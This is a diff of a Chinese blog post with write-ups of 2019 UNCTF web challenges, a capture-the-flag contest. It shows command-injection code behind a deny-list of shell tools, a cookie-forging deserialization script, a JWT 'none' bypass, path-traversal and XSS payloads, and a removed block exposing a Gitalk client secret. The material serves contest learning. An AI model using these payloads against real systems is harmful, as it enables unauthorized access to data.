 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"> <span class="comment">// try bypass it</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $a))</span><br><span class="line">        $a = <span class="string">""</span>;</span><br><span class="line">        $a =<span class="string">'"'</span> . $a . <span class="string">'"'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span>, $b))</span><br><span class="line">        $b = <span class="string">""</span>;</span><br><span class="line">        $b = <span class="string">'"'</span> . $b . <span class="string">'"'</span>;</span><br><span class="line">     $cmd = <span class="string">"file $a $b"</span>;</span><br><span class="line">     var_dump($cmd);</span><br><span class="line">      str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"$cmd"</span>); </span><br><span class="line">     system($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -329,29 +233,11 @@
 
 <p><img src="./1571918707614.png" alt="1571918707614"></p>
 <h2 id="题目修改后"><a href="#题目修改后" class="headerlink" title="题目修改后"></a>题目修改后</h2><p><code>\</code> 转义双引号，<code>%20#</code>为命令终止符号逃逸最后一个双引号执行命令的限制。</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1572001510478.png" alt="1572001510478" title="">
-                </div>
-                <div class="image-caption">1572001510478</div>
-            </figure>
-
-
-
+<p><img src="./1572001510478.png" alt="1572001510478"></p>
 <h1 id="easy-pentest"><a href="#easy-pentest" class="headerlink" title="easy_pentest"></a>easy_pentest</h1><ol>
 <li>利用tp生成的日志，信息泄露</li>
 </ol>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1572166521292.png" alt="1572166521292" title="">
-                </div>
-                <div class="image-caption">1572166521292</div>
-            </figure>
-
-
-
+<p><img src="./1572166521292.png" alt="1572166521292"></p>
 <ol start="2">
 <li>利用tp rce 读取waf.php</li>
 </ol>
@@ -383,14 +269,7 @@ http://101.71.29.5:10021/public/index.php?safe_key=easy_pentesnt_is_s0fun&amp;s=
 <p><img src="./1572071033980.png" alt="1572071033980"></p>
 <h1 id="k-amp-k"><a href="#k-amp-k" class="headerlink" title="k&amp;k"></a>k&amp;k</h1><p>m参数消毒不完全，直接伪协议扒光所有代码。</p>
 <p>1.存在备份文件access.php.bak</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./99.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="./99.png" alt=""></p>
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $funny = <span class="string">'O:5:"debug":4:&#123;s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&amp;key";s:2:"ob";N;&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=(<span class="keyword">new</span> debug());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> session();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$key = base64_encode($str);</span><br><span class="line">	$key = bin2hex($key);</span><br><span class="line">	$arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num + <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'&amp;'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_decode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$data = urldecode($str);</span><br><span class="line">	$data = substr($data, <span class="number">1</span>);</span><br><span class="line">	$arr = explode(<span class="string">'&amp;'</span>, $data);</span><br><span class="line">	$cipher = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		$num = hexdec($value);</span><br><span class="line">		$num = $num - <span class="number">240</span>;</span><br><span class="line">		$cipher = $cipher.<span class="string">'%'</span>.dechex($num);</span><br><span class="line">	&#125;</span><br><span class="line">	$key = urldecode($cipher);</span><br><span class="line">	$key = base64_decode($key);</span><br><span class="line">	<span class="keyword">return</span> $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cookie = <span class="string">"%26144%2616a%2615f%26123%2613f%26159%2613a%2616a%2614a%26148%2613e%2616a%26151%26147%26129%26165%26139%2615a%2615f%2616a%2613f%2615e%26164%2616a%2613f%2615a%26149%26126%26139%2615d%2613e%2615f%26152%26122%26129%2616a%2614a%26143%26139%26127%26151%26144%2615f%26168%2613f%26123%2613d%26126%2613d%2615a%2615f%26159%26151%26147%26141%26159%2613f%26122%2615b%26126%2613d%26144%26164%2616a%2613f%2615a%26157%26126%26139%2615e%26146%2616a%2614a%26148%2613a%26165%26149%26147%26121%2615c%26139%2615a%26164%2616a%2613f%2615a%26153%26126%26139%2615e%26146%26165%26149%26147%26142%26164%26151%26147%26124%26159%2613f%26123%26120%2612d"</span>;</span><br><span class="line"><span class="keyword">echo</span> cookie_decode($cookie);</span><br></pre></td></tr></table></figure>
 
 
@@ -437,406 +316,168 @@ http://101.71.29.5:10021/public/index.php?safe_key=easy_pentesnt_is_s0fun&amp;s=
 </ol>
 <p>不会写脚本直接手lu,得到password：<strong>HappY4Gr4phQL</strong></p>
 <h1 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h1><p>登录注册界面</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573556772013.png" alt="1573556772013" title="">
-                </div>
-                <div class="image-caption">1573556772013</div>
-            </figure>
-
-
-
+<p><img src="./1573556772013.png" alt="1573556772013"></p>
 <p>登录之后，服务端本地开启9000端口读取本地文件，路径依据注册的账号，可以便利目录读文件</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573556758357.png" alt="1573556758357" title="">
-                </div>
-                <div class="image-caption">1573556758357</div>
-            </figure>
-
+<p><img src="./1573556758357.png" alt="1573556758357"></p>
 <p>Express框架，读取<strong><a href="http://127.0.0.1:9000/upload/../package.json?.jpg" target="_blank" rel="noopener">http://127.0.0.1:9000/upload/../package.json?.jpg</a></strong></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573556592148.png" alt="1573556592148" title="">
-                </div>
-                <div class="image-caption">1573556592148</div>
-            </figure>
-
-
-
+<p><img src="./1573556592148.png" alt="1573556592148"></p>
 <p>后端使用jwt构造身份验证</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573565534827.png" alt="1573565534827" title="">
-                </div>
-                <div class="image-caption">1573565534827</div>
-            </figure>
-
+<p><img src="./1573565534827.png" alt="1573565534827"></p>
 <ol>
 <li>利用express当传入algorithm为none，会使用algorithm none解密</li>
 <li><code>var secret = global.secretlist[id];</code> 传入不存在的id，使得secret为undefined</li>
 </ol>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573565835641.png" alt="1573565835641" title="">
-                </div>
-                <div class="image-caption">1573565835641</div>
-            </figure>
-
+<p><img src="./1573565835641.png" alt="1573565835641"></p>
 <p>在login界面增加伪造token，并登录,进入admin后台，session.name=’admin’，就能够访问admin23333_interface.js</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573566009065.png" alt="1573566009065" title="">
-                </div>
-                <div class="image-caption">1573566009065</div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573565975973.png" alt="1573565975973" title="">
-                </div>
-                <div class="image-caption">1573565975973</div>
-            </figure>
-
+<p><img src="./1573566009065.png" alt="1573566009065"></p>
+<p><img src="./1573565975973.png" alt="1573565975973"></p>
 <p>admin23333_interface.js有个文件读取接口,参数可控</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573566045820.png" alt="1573566045820" title="">
-                </div>
-                <div class="image-caption">1573566045820</div>
-            </figure>
-
+<p><img src="./1573566045820.png" alt="1573566045820"></p>
 <p>用到两个trick:</p>
 <ol>
 <li>传入a[b]=1 会转为a={“b”:1}构造为对象，正则匹配无法识别对象，爆warnnig绕过第一个if</li>
 <li>length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express  中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成</li>
 </ol>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573562632890.png" alt="1573562632890" title="">
-                </div>
-                <div class="image-caption">1573562632890</div>
-            </figure>
-
-
-
+<p><img src="./1573562632890.png" alt="1573562632890"></p>
 <p>payload:<code>&lt;http://183.129.189.60:10047/admin23333_interface?name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g&gt;</code></p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1573566304858.png" alt="1573566304858" title="">
-                </div>
-                <div class="image-caption">1573566304858</div>
-            </figure>
-
-
-
-
-
+<p><img src="./1573566304858.png" alt="1573566304858"></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'123'</span> onerror=<span class="string">'alert(1)'</span> &gt;</span><br></pre></td></tr></table></figure>
 
 
 
 <p><img src="./1573567727736.png" alt="1573567727736"></p>
 
-        </div>
-
-        <blockquote class="post-copyright">
-    
-    <div class="content">
-        
-<span class="post-time">
-    最后更新时间：<time datetime="2020-05-15T08:25:52.000Z" itemprop="dateUpdated">2020-05-15 16:25:52</time>
-</span><br>
-
-
-        
-        玩的开心
-        
-    </div>
-    
-    <footer>
-        <a href="http://zhzhdoai.github.io">
-            <img src="/img/avatar.jpg" alt="osword">
-            osword
-        </a>
-    </footer>
-</blockquote>
-
-        
-
-
-        <div class="post-footer">
-            
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
-
-
-            
-<div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=《2019UNCTF WEB题解》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=《2019UNCTF WEB题解》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019UNCTF WEB题解》 — osword's blog&url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-
-
-        </div>
-    </div>
-
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">2019上海大学生网络安全竞赛web题解</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">ATS反向代理环境搭建</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
-
-    
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<section class="comments" id="comments">
-    <div id="gitalk-container"></div>
-    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
-    <script src="/js/md5.min.js"></script>
-    <script>
-        var gitalk = new Gitalk({
-            clientID: '7d7576c71632f14d639a',
-            clientSecret: '3d7f7e4c0e9a43a2cc5334d68aee612090df8b70',
-            repo: 'zhzhdoai.github.io',
-            owner: 'zhzhdoai',
-            admin: 'zhzhdoai',
-            id: md5(location.pathname),
-            perPage: 50,
-            distractionFreeMode: 'false'
-        })
-
-        gitalk.render('gitalk-container')
-    </script>
-</section>
-
-
-
+  </div>
 </article>
 
 
 
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Twice-Insert"><span class="toc-number">1.</span> <span class="toc-text">Twice_Insert</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的备忘录"><span class="toc-number">2.</span> <span class="toc-text">简单的备忘录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">3.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#审计一下世界上最好的语言吧"><span class="toc-number">4.</span> <span class="toc-text">审计一下世界上最好的语言吧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass"><span class="toc-number">5.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-1"><span class="toc-number">5.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目修改后"><span class="toc-number">5.2.</span> <span class="toc-text">题目修改后</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-pentest"><span class="toc-number">6.</span> <span class="toc-text">easy_pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell思路"><span class="toc-number">6.1.</span> <span class="toc-text">getshell思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#k-amp-k"><span class="toc-number">7.</span> <span class="toc-text">k&amp;k</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">7.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">7.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-admin"><span class="toc-number">8.</span> <span class="toc-text">easy_admin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-number">9.</span> <span class="toc-text">NSB Reset Password</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#加密的备忘录"><span class="toc-number">10.</span> <span class="toc-text">加密的备忘录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Arbi"><span class="toc-number">11.</span> <span class="toc-text">Arbi</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&text=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&is_video=false&description=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019UNCTF WEB题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&name=2019UNCTF WEB题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&t=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
 </div>
 
-        <footer class="footer">
-    <div class="top">
         
-<p>
-    <span id="busuanzi_container_site_uv" style='display:none'>
-        站点总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style='display:none'>
-        站点总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-        <p>
-            
-                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
-            
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
-        </p>
-    </div>
-    <div class="bottom">
-        <p><span>osword &copy; 2015 - 2020</span>
-            <span>
-                
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
-            </span>
-        </p>
-    </div>
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2020
+    osword
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=《2019UNCTF WEB题解》 — osword's blog&pic=http://zhzhdoai.github.io/img/avatar.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=《2019UNCTF WEB题解》 — osword's blog&source=" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" data-title=" Facebook">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2019UNCTF WEB题解》 — osword's blog&url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&via=http://zhzhdoai.github.io" data-title=" Twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" data-title=" Google+">
-          <i class="icon icon-google-plus"></i>
-        </a>
-      </li>
-    </ul>
- </div>
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
 
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
